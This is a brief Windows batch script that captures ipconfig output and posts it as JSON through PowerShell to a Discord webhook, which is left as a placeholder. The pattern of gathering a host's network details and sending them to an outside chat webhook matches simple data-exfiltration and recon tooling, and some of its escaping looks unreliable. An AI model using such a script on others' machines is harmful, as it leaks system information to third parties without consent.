@echo off
:: Run ipconfig and save the output to a file
ipconfig > ipconfig_output.txt

:: Initialize the output variable
setlocal enabledelayedexpansion
set "output="

:: Read the file content into the variable
for /F "delims=" %%i in (ipconfig_output.txt) do (
    set "output=!output!%%i`n"
)

:: Escape backslashes and double quotes
set "output=%output:\=\\%"
set "output=%output:"=\"%"

:: Prepare the JSON payload
set "payload={\"content\":\"```%output%```\"}"

:: Replace YOUR_DISCORD_WEBHOOK_URL with your actual webhook URL
set "webhook_url= YOUR_WEBHOOK"

:: Use PowerShell to send the payload to Discord
powershell -Command "Invoke-RestMethod -Uri '%webhook_url%' -Method Post -ContentType 'application/json' -Body '%payload%'"
